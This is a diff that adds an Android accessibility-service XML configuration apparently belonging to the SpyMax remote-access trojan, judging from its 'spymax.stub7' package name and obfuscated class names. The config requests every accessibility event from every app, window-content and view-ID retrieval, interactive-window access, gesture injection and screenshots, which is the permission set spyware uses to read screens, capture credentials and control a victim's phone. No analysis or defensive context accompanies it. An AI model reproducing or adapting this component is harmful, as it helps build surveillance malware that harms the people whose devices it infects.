@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service android:description="@string/Descrip" android:settingsActivity="spymax.stub7.activz.servziz.ClassGen12" android:accessibilityEventTypes="typeAllMask" android:packageNames="@null" android:accessibilityFeedbackType="feedbackAllMask" android:notificationTimeout="0" android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows" android:canRetrieveWindowContent="true" android:canPerformGestures="true" android:canTakeScreenshot="true"
+  xmlns:android="http://schemas.android.com/apk/res/android" />
